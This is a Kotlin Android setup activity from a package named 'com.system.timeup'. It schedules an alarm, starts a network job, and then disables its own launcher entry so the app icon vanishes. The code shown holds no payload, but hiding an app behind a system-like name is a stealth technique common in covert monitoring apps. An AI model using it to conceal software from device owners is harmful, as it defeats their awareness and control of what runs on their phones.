package com.system.timeup

import android.app.Activity
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Bundle

class SetupActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        FileLog.i(this, "SetupActivity -> init done, hide icon, schedule alarm + kick work")

        // 第一次为了“可验证”：1分钟后触发一次（你验收完可改成 DEFAULT_DELAY_MS）
        AlarmScheduler.ensureNext(this, 60_000L)

        // 立即 kick 一个联网工作（需要网络才跑）
        WorkKick.kickNow(this, reason = "setup")

        disableLauncherAlias()
        finish()
    }

    private fun disableLauncherAlias() {
        val cn = ComponentName(this, "com.system.timeup.LauncherAlias")
        packageManager.setComponentEnabledSetting(
            cn,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        FileLog.i(this, "LauncherAlias disabled (icon should disappear after launcher refresh)")
    }
}